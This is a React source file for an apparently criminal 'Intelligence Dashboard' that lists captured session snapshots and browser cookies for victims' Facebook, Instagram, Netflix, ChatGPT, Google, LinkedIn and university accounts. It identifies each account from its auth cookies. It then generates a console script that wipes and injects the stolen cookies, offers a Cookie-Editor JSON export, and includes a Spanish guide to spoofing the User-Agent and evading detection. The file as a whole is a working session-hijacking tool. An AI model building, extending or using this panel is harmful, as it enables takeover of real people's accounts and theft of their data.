"use client";

import React, { useEffect, useState } from "react";
import { supabase, SessionSnapshot, Cookie } from "@/lib/supabase";
import GlassCard from "@/components/GlassCard";
import { 
  Search, Clock, Globe, ExternalLink, 
  Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy,
  Twitter, MessageSquare, Play, AlertCircle, Palette, Gamepad2, Mail, Bot, Monitor, Tablet, Smartphone, Info, RefreshCw, FileJson, Download,
  Youtube, Linkedin, ShoppingCart, HelpCircle, ChevronRight, X, Cpu
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

interface AccountInfo {
  platform: string;
  identifier: string;
  icon: any;
  color: string;
  health: "active" | "expiring" | "expired";
}

const formatRelativeTime = (date: string) => {
  const now = new Date();
  const captured = new Date(date);
  const diffInSeconds = Math.floor((now.getTime() - captured.getTime()) / 1000);

  if (diffInSeconds < 60) return "just now";
  if (diffInSeconds < 3600) return `${Math.floor(diffInSeconds / 60)}m ago`;
  if (diffInSeconds < 86400) return `${Math.floor(diffInSeconds / 3600)}h ago`;
  return captured.toLocaleDateString();
};

export default function SessionsPage() {
  const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<SessionSnapshot | null>(null);
  const [cookies, setCookies] = useState<Cookie[]>([]);
  const [loadingCookies, setLoadingCookies] = useState(false);
  const [accountMap, setAccountMap] = useState<Record<string, AccountInfo>>({});
  const [copied, setCopied] = useState(false);
  const [copiedJson, setCopiedJson] = useState(false);
  const [showGuide, setShowGuide] = useState(false);

  useEffect(() => {
    fetchSessions();
    const timer = setInterval(() => fetchSessions(), 60000);
    return () => clearInterval(timer);
  }, []);

  const getHealthStatus = (sessionCookies: Cookie[]): "active" | "expiring" | "expired" => {
    if (!sessionCookies || sessionCookies.length === 0) return "active";
    const now = Date.now() / 1000;
    const sessionCookie = sessionCookies.find(c => ["c_user", "ds_user_id", "auth_token", "SID", "NetflixId", "li_at", "LOGIN_INFO"].includes(c.name));
    if (!sessionCookie || !sessionCookie.expiration_date) return "active";
    if (sessionCookie.expiration_date < now) return "expired";
    if (sessionCookie.expiration_date < now + 604800) return "expiring";
    return "active";
  };

  const identifyAccount = (sessionCookies: Cookie[], fallbackId: string): AccountInfo => {
    const health = getHealthStatus(sessionCookies);
    const domainStr = sessionCookies.map(c => c.domain.toLowerCase()).join(" ");
    
    // Platform mapping
    if (domainStr.includes("facebook.com")) {
      const fbId = sessionCookies.find(c => c.name === "c_user")?.value;
      return { platform: "Facebook", identifier: fbId || "Account", icon: Facebook, color: "text-blue-500", health };
    }
    if (domainStr.includes("instagram.com")) {
      const igId = sessionCookies.find(c => c.name === "ds_user_id")?.value;
      return { platform: "Instagram", identifier: igId || "Account", icon: Instagram, color: "text-pink-500", health };
    }
    if (domainStr.includes("youtube.com") || domainStr.includes("google.com/youtube")) {
      return { platform: "YouTube", identifier: "Viewer", icon: Youtube, color: "text-red-500", health };
    }
    if (domainStr.includes("grok.com") || domainStr.includes("x.com/i/grok")) {
      return { platform: "Grok AI", identifier: "Agent", icon: Bot, color: "text-purple-400", health };
    }
    if (domainStr.includes("linkedin.com")) {
      return { platform: "LinkedIn", identifier: "Professional", icon: Linkedin, color: "text-blue-600", health };
    }
    if (domainStr.includes("mercadolibre.com")) {
      return { platform: "Mercado Libre", identifier: "Buyer", icon: ShoppingCart, color: "text-yellow-400", health };
    }
    if (domainStr.includes("gemini.google.com")) {
      return { platform: "Gemini", identifier: "AI Model", icon: MessageSquare, color: "text-blue-300", health };
    }
    if (domainStr.includes("openai.com") || domainStr.includes("chatgpt.com")) 
      return { platform: "ChatGPT", identifier: "AI Assistant", icon: Cpu, color: "text-emerald-400", health };
    if (domainStr.includes("kick.com"))
      return { platform: "Kick", identifier: "Streamer", icon: Gamepad2, color: "text-green-500", health };
    if (domainStr.includes("x.com") || domainStr.includes("twitter.com"))
      return { platform: "X / Twitter", identifier: "Social", icon: Twitter, color: "text-blue-400", health };
    if (domainStr.includes("netflix.com"))
      return { platform: "Netflix", identifier: "Viewer", icon: Play, color: "text-red-600", health };
    if (domainStr.includes("up.edu.pe") || domainStr.includes("blackboard.com"))
      return { platform: "Blackboard", identifier: "Student", icon: GraduationCap, color: "text-blue-400", health };
    if (domainStr.includes("google.com"))
      return { platform: "Google", identifier: "User", icon: Globe, color: "text-red-400", health };

    // Generic fallback based on domain if we found any cookie
    if (sessionCookies.length > 0) {
      const mainDomain = sessionCookies[0].domain.split('.').slice(-2)[0];
      const capitalized = mainDomain.charAt(0).toUpperCase() + mainDomain.slice(1);
      return { platform: capitalized, identifier: "Session", icon: Globe, color: "text-amber-400", health };
    }

    return { platform: "Unknown", identifier: fallbackId || "Anonymous", icon: Shield, color: "text-gray-400", health: "active" };
  };

  const fetchSessions = async () => {
    const { data: sessionData } = await supabase
      .from("session_snapshots")
      .select("*")
      .order("captured_at", { ascending: false })
      .limit(100);
    
    if (sessionData) {
      setSessions(sessionData);
      const sessionIds = sessionData.map(s => s.id);
      const { data: identifyingCookies } = await supabase
        .from("cookies")
        .select("*")
        .in("snapshot_id", sessionIds)
        .or("name.eq.c_user,name.eq.ds_user_id,name.eq.auth_token,name.eq.SID,name.eq.NetflixId,name.eq.li_at,name.eq.dpr,name.eq.csrftoken,name.eq.sessionid,name.eq.LOGIN_INFO,name.eq.__Secure-1PSID,name.eq.x-session-id");
      
      const newAccountMap: Record<string, AccountInfo> = {};
      sessionData.forEach(session => {
        const sessionCookies = identifyingCookies?.filter(c => c.snapshot_id === session.id) || [];
        newAccountMap[session.id] = identifyAccount(sessionCookies, session.user_id);
      });
      setAccountMap(newAccountMap);
    }
    setLoading(false);
  };

  const fetchCookies = async (snapshotId: string) => {
    setLoadingCookies(true);
    const { data } = await supabase
      .from("cookies")
      .select("*")
      .eq("snapshot_id", snapshotId)
      .limit(1500);
    if (data) setCookies(data);
    setLoadingCookies(false);
  };

  const handleSessionClick = (session: SessionSnapshot) => {
    setSelectedSession(session);
    setCopied(false);
    setCopiedJson(false);
    fetchCookies(session.id);
  };

  const generateConsoleScript = () => {
    if (cookies.length === 0) return "";
    return `(function() {
  const cookies = ${JSON.stringify(cookies)};
  console.clear();
  console.log('%c [SessionSafe] INICIANDO RESTAURACIÓN DEEP ', 'background: #2563eb; color: #fff; font-weight: bold; padding: 5px; border-radius: 3px;');
  
  console.log('%c [1/3] Limpiando estado previo... ', 'color: #f59e0b;');
  document.cookie.split(";").forEach(function(c) { 
    const name = c.split("=")[0].trim();
    const domain = location.hostname;
    const baseDomain = domain.split('.').slice(-2).join('.');
    
    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;"; 
    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + domain;
    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=." + domain;
    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=." + baseDomain;
  });

  console.log('%c [2/3] Inyectando ' + cookies.length + ' cookies... ', 'color: #3b82f6;');
  let HttpOnlyCount = 0;
  
  cookies.forEach(c => {
    if (c.http_only) HttpOnlyCount++;
    try {
      let cookieStr = c.name + '=' + c.value + 
                    '; domain=' + (c.domain.startsWith('.') ? c.domain : ('.' + c.domain)) + 
                    '; path=' + (c.path || '/') + 
                    '; SameSite=Lax; Secure';
      document.cookie = cookieStr;
    } catch (e) {}
  });

  console.log('%c [3/3] Verificando resultados... ', 'color: #10b981;');
  if (HttpOnlyCount > 0) {
    console.warn('%c [!] ATENCIÓN: Se detectaron ' + HttpOnlyCount + ' cookies HttpOnly. ', 'background: #7c2d12; color: #fbbf24; padding: 3px;');
    console.warn('Nota: Las cookies HttpOnly (como el sessionid) NO se pueden inyectar desde la consola.');
    console.warn('Usa la opción "Descargar JSON" e impórtalo en Cookie-Editor.');
  }

  console.log('%c ¡CAPTURA COMPLETADA! Recargando... ', 'background: #10b981; color: #fff; font-weight: bold; padding: 5px;');
  setTimeout(() => location.reload(), 1500);
})();`;
  };

  const copyToClipboard = () => {
    const script = generateConsoleScript();
    if (!script) return;
    navigator.clipboard.writeText(script).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 5000);
    }).catch(() => prompt("Copia este código:", script));
  };

  const copyCookiesJson = () => {
    const formatted = cookies.map(c => ({
      domain: c.domain.startsWith('.') ? c.domain : '.' + c.domain,
      expirationDate: c.expiration_date || (Math.floor(Date.now() / 1000) + 86400 * 30),
      hostOnly: false,
      httpOnly: c.http_only,
      name: c.name,
      path: c.path || "/",
      sameSite: "no_restriction",
      secure: c.secure,
      session: c.is_session,
      storeId: c.store_id || "0",
      value: c.value
    }));
    
    const json = JSON.stringify(formatted, null, 2);
    navigator.clipboard.writeText(json).then(() => {
      setCopiedJson(true);
      setTimeout(() => setCopiedJson(false), 5000);
    });
  };

  const getDeviceIcon = (ua?: string) => {
    if (!ua) return Monitor;
    const lowerUA = ua.toLowerCase();
    if (lowerUA.includes("mobi") || lowerUA.includes("android") || lowerUA.includes("iphone")) return Smartphone;
    if (lowerUA.includes("tablet") || lowerUA.includes("ipad")) return Tablet;
    return Monitor;
  };

  const filteredSessions = sessions.filter(s => 
    s.user_id?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    accountMap[s.id]?.identifier.toLowerCase().includes(searchTerm.toLowerCase()) ||
    accountMap[s.id]?.platform.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="relative min-h-screen">
      <div className="space-y-8 max-w-7xl mx-auto pb-40 px-6">
        <header className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div>
            <h2 className="text-4xl font-black tracking-tight bg-gradient-to-r from-blue-400 to-emerald-400 bg-clip-text text-transparent">
              Intelligence Dashboard
            </h2>
            <p className="text-gray-500 font-medium">Monitoring {sessions.length} sessions from multiple neural sources.</p>
          </div>
          
          <div className="flex items-center gap-3">
            <div className="glass flex items-center px-4 py-2 rounded-2xl border border-white/10 w-full md:w-64">
              <Search className="text-gray-500 mr-2" size={18} />
              <input 
                type="text" 
                placeholder="Search platforms..." 
                className="bg-transparent border-none outline-none text-sm w-full py-2 placeholder:text-gray-600"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            </div>
            <button onClick={() => {setLoading(true); fetchSessions();}} className="glass p-2.5 rounded-xl hover:bg-white/5 transition-colors">
              <RefreshCw size={20} className={loading ? "animate-spin text-blue-400" : "text-gray-400"} />
            </button>
            <button onClick={() => setShowGuide(!showGuide)} className="glass flex items-center gap-2 px-4 py-2 rounded-xl text-blue-400 border border-blue-500/20 font-bold text-sm">
              <HelpCircle size={18} /> MANUAL
            </button>
          </div>
        </header>

        {loading ? (
          <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
            {[1, 2, 3, 4, 5, 6, 7, 8].map(i => <div key={i} className="h-48 glass rounded-3xl animate-pulse" />)}
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
            {filteredSessions.map((session) => {
              const info = accountMap[session.id] || { platform: "Unknown", identifier: "Anonymous", icon: Shield, color: "text-gray-400", health: "active" };
              const UAIcon = getDeviceIcon(session.user_agent);
              
              return (
                <motion.div
                  key={session.id}
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  whileHover={{ y: -5 }}
                  onClick={() => handleSessionClick(session)}
                  className={`glass p-6 rounded-[2.5rem] cursor-pointer border transition-all duration-300 ${selectedSession?.id === session.id ? "border-blue-500/50 bg-blue-500/5 shadow-2xl shadow-blue-500/10" : "border-white/5 hover:border-white/20"}`}
                >
                  <div className="flex items-start justify-between mb-4">
                    <div className={`p-4 rounded-2xl bg-white/5 shadow-inner ${info.color}`}>
                      <info.icon size={26} strokeWidth={2.5} />
                    </div>
                    <div className="flex flex-col items-end gap-1.5">
                      <div className="glass-pill px-3.5 py-1.5 rounded-full text-[9px] font-black text-white/40 uppercase tracking-[0.1em] border border-white/5">
                        {info.platform}
                      </div>
                      <div className={`text-[8px] font-black uppercase px-2 py-1 rounded-full flex items-center gap-1 shadow-sm ${
                        info.health === "active" ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20" : "bg-red-500/10 text-red-400 border border-red-500/20"
                      }`}>
                        <div className={`w-1 h-1 rounded-full ${info.health === "active" ? "bg-emerald-400" : "bg-red-400"}`} />
                        {info.health}
                      </div>
                    </div>
                  </div>
                  <div>
                    <h4 className="font-extrabold text-lg truncate text-white/90 mb-1">{info.identifier}</h4>
                    <div className="flex items-center justify-between mt-3">
                      <div className="flex items-center gap-1.5 text-[10px] font-bold text-gray-500">
                        <Clock size={12} />
                        {formatRelativeTime(session.captured_at)}
                      </div>
                      {session.user_agent && (
                        <div className="flex items-center gap-1.5 text-[9px] font-black text-blue-400/80 bg-blue-400/5 px-2.5 py-1.5 rounded-xl border border-blue-400/10 uppercase">
                          <UAIcon size={12} /> UA OK
                        </div>
                      )}
                    </div>
                  </div>
                </motion.div>
              );
            })}
          </div>
        )}

        <AnimatePresence>
          {showGuide && (
            <motion.div 
              initial={{ opacity: 0, x: 300 }} 
              animate={{ opacity: 1, x: 0 }} 
              exit={{ opacity: 0, x: 300 }} 
              className="fixed top-24 right-8 w-80 z-40"
            >
              <GlassCard className="p-6 border-l-4 border-blue-500 bg-black/80 backdrop-blur-2xl">
                <div className="flex items-center justify-between mb-6">
                  <h5 className="font-black text-sm uppercase tracking-widest text-blue-400">Guía de Restauración</h5>
                  <button onClick={() => setShowGuide(false)} className="p-1 hover:bg-white/5 rounded-lg"><X size={16} /></button>
                </div>
                <div className="space-y-6">
                  {[
                    { step: "01", title: "Copia el User-Agent", desc: "Pégalo en la extensión 'User-Agent Switcher' para disfrazarte." },
                    { step: "02", title: "Limpiar Dominio", desc: "Entra a la web deseada (ej: instagram.com) antes de inyectar." },
                    { step: "03", title: "Importar JSON", desc: "Usa el botón de JSON si la consola falla. Es el método más seguro." },
                    { step: "04", title: "¡Entrar!", desc: "Presiona F12, ve a la Consola y pega el código si usas ese método." }
                  ].map((item, idx) => (
                    <div key={idx} className="flex gap-4">
                      <div className="text-xl font-black text-white/10">{item.step}</div>
                      <div>
                        <div className="text-xs font-black text-white/80 uppercase mb-1">{item.title}</div>
                        <p className="text-[11px] text-gray-500 leading-normal">{item.desc}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </GlassCard>
            </motion.div>
          )}
        </AnimatePresence>

        <AnimatePresence>
          {selectedSession && (
            <motion.div initial={{ opacity: 0, y: 100 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: 100 }} className="fixed bottom-0 left-0 right-0 p-8 z-50 pointer-events-none">
              <div className="max-w-6xl mx-auto pointer-events-auto">
                <GlassCard className="border-t-2 border-blue-500 shadow-2xl bg-black/95 backdrop-blur-3xl px-8 py-8 rounded-[3rem]">
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                    <div className="space-y-6">
                      <div className="flex items-center gap-5">
                        <div className={`p-6 rounded-[2rem] bg-white/5 shadow-inner ${accountMap[selectedSession.id]?.color}`}>
                          {accountMap[selectedSession.id]?.icon && React.createElement(accountMap[selectedSession.id].icon, { size: 56 })}
                        </div>
                        <div>
                          <h3 className="text-4xl font-black text-white/90">{accountMap[selectedSession.id]?.platform}</h3>
                          <div className="flex items-center gap-2 text-gray-500 font-bold mt-1 uppercase text-xs tracking-widest">
                            <Clock size={14} /> CAPTURA: {new Date(selectedSession.captured_at).toLocaleString()}
                          </div>
                        </div>
                      </div>

                      <div className="p-4 rounded-3xl bg-blue-500/5 border border-blue-500/10">
                        <div className="flex items-center gap-2 text-blue-400 mb-3 font-black text-xs uppercase tracking-widest">
                          <Monitor size={16} /> USER-AGENT REQUERIDO
                        </div>
                        {selectedSession.user_agent ? (
                          <div className="text-xs font-mono text-gray-400 break-all leading-relaxed bg-black/40 p-4 rounded-2xl border border-white/5">
                            {selectedSession.user_agent}
                          </div>
                        ) : (
                          <div className="flex flex-col items-center justify-center gap-2 p-6 bg-red-500/5 rounded-2xl border border-red-500/10 text-center">
                            <AlertCircle size={24} className="text-red-400/50" />
                            <p className="text-xs text-gray-400 font-medium max-w-[200px]">
                              Sesión sin firma UA guardada. Se recomienda usar Chrome en Windows por defecto.
                            </p>
                          </div>
                        )}
                      </div>
                    </div>

                    <div className="flex flex-col justify-center space-y-4">
                      <div className="flex flex-col gap-3">
                        <div className="flex items-center justify-between px-3 text-emerald-400 font-black text-xs uppercase tracking-[0.15em]">
                          <div className="flex items-center gap-2"><Check size={18} /> RESTORE READY ({cookies.length})</div>
                          {cookies.some(c => c.http_only) && (
                            <div className="flex items-center gap-1.5 text-amber-400 bg-amber-400/10 px-3 py-1.5 rounded-full border border-amber-500/20">
                              <AlertCircle size={14} /> HttpOnly
                            </div>
                          )}
                        </div>
                        
                        <div className="flex flex-col gap-4">
                          <button 
                            onClick={copyToClipboard}
                            className={"w-full flex items-center justify-center gap-4 px-10 py-6 rounded-[2rem] font-black text-2xl shadow-2xl transition-all active:scale-95 " + (copied ? "bg-emerald-600 shadow-emerald-500/20" : "bg-blue-600 hover:bg-blue-500 shadow-blue-500/20 border-t border-white/10")}
                          >
                            {copied ? <><Check size={32} /> ¡COPIADO!</> : <><Copy size={32} /> RESTAURAR (CONSOLA)</>}
                          </button>

                          <div className="flex gap-4">
                            <button 
                              onClick={copyCookiesJson}
                              className={"flex-1 flex items-center justify-center gap-3 p-5 rounded-[1.5rem] glass font-black text-xs uppercase tracking-widest transition-all " + (copiedJson ? "text-emerald-400 border-emerald-500/30" : "text-white/60 hover:bg-white/5 border-white/5")}
                            >
                              {copiedJson ? <><Check size={20} /> JSON COPIADO</> : <><FileJson size={20} /> MÉTODO JSON (RECOMENDADO)</>}
                            </button>
                            <button onClick={() => setSelectedSession(null)} className="px-8 py-5 rounded-[1.5rem] glass font-black text-white/30 text-xs uppercase tracking-widest border-white/5">
                              CERRAR
                            </button>
                          </div>
                        </div>
                      </div>
                      <div className="p-5 rounded-[1.5rem] bg-amber-500/5 border border-amber-500/10 flex gap-4">
                         <div className="p-3 rounded-xl bg-amber-500/10 h-fit text-amber-400"><Info size={20} /></div>
                         <p className="text-[12px] text-amber-200/60 leading-relaxed font-medium">
                           <b>SISTEMA ANTI-DETECCIÓN:</b> Si el sitio tiene cookies HttpOnly (como Instagram), la consola no podrá inyectarlas todas. Usa el botón **JSON** e impórtalo con la extensión **"Cookie-Editor"** para entrada total.
                         </p>
                      </div>
                    </div>
                  </div>
                </GlassCard>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}
